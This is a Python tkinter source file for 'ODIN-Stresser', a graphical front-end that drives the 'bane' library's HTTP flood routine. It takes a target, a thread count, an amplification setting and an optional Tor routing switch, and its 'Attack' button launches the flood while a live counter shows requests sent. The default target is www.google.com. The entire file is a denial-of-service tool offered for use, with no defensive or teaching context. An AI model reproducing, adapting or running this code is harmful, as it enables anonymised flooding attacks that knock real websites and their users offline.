from tkinter import *
import bane,threading,time
from tkinter.messagebox import *
class coun(threading.Thread):
  def run(self):
   while (bane.ddos.stop!=True):
    var.set('Requests sent: '+str(bane.ddos.counter))
    main.update_idletasks()
    time.sleep(.001)
l=False
to=False
class at(threading.Thread):
 def run(self):
  global l
  global to
  try:
   if logs.get().lower()=='on':
    l=True
   if tor.get().lower()=='on':
    to=True
   bane.httpflood(target.get(),p=int(port.get()),threads=int(threads.get()),interval=int(interval.get()),ampli=int(ampli.get()),logs=l,maxtime=int(timeout.get()),roundmin=int(mini.get()),roundmax=int(maxi.get()),level=int(speed.get()),settor=to)
  except:
   pass
def attack():
 bane.ddos.counter=0
 bane.ddos.stop=False
 at().start()
 coun().start()
class ki(threading.Thread):
 def run(self):
  bane.ddos.stop=True
def kill():
 ki().start()

main = Tk()
main.title("ODIN-Stresser")
main.configure(background='light sky blue')
Label(main, text = "Target:",background='light sky blue').grid(row=0)
Label(main, text = "Port:",background='light sky blue').grid(row=1)
Label(main, text = "Threads:",background='light sky blue').grid(row=2)
Label(main, text = "Duration: (seconds)",background='light sky blue').grid(row=3)
Label(main, text = "Amplification: (1-100)",background='light sky blue').grid(row=4)
Label(main, text = "Timeout: (seconds)",background='light sky blue').grid(row=5)
Label(main, text = "Max. requests / connection:",background='light sky blue').grid(row=6)
Label(main, text = "Min. requests / connection:",background='light sky blue').grid(row=7)
Label(main, text = "Speed level: (1-5)",background='light sky blue').grid(row=8)
Label(main, text = "Tor: (on-off)",background='light sky blue').grid(row=9)
Label(main, text = "Logs: (on-off)",background='light sky blue').grid(row=10)
Label(main, text = "",background='light sky blue').grid(row=11)
var = StringVar()
var.set('Requests sent: ' + str(bane.ddos.counter))
l = Label(main, textvariable = var,background='light sky blue').grid(row=12)
Label(main, text = "",background='light sky blue').grid(row=13)
target = Entry(main)
target.insert(0,'www.google.com')
port = Entry(main)
port.insert(1, "80")
threads= Entry(main)
threads.insert(2,'500')
interval=Entry(main)
interval.insert(3,'300')
ampli=Entry(main)
ampli.insert(4,'1')
timeout=Entry(main)
timeout.insert(5,'5')
maxi=Entry(main)
maxi.insert(6,'15')
mini=Entry(main)
mini.insert(7,'5')
speed=Entry(main)
speed.insert(8,'1')
tor=Entry(main)
tor.insert(9,'off')
logs=Entry(main)
logs.insert(10,'off')

target.grid(row=0, column=1)
port.grid(row=1, column=1)
threads.grid(row=2, column=1)
interval.grid(row=3, column=1)
ampli.grid(row=4, column=1)
timeout.grid(row=5,column=1)
maxi.grid(row=6,column=1)
mini.grid(row=7,column=1)
speed.grid(row=8, column=1)
tor.grid(row=9, column=1)
logs.grid(row=10, column=1)
Button(main, text='Quit', command=main.destroy).grid(row=14, column=0, sticky=W, pady=4)
Button(main, text='Stop', command=kill).grid(row=14, column=2, sticky=W, pady=4)
Button(main, text='Attack', command=attack).grid(row=14, column=4, sticky=W, pady=4)
Label(main, text = "\n\n\nCoder: Ala Bouali\nGithub: https://github.com/AlaBouali\nE-mail: trap.leader.123@gmail.com\n", background='light sky blue').grid(row=16,column=1)
mainloop()
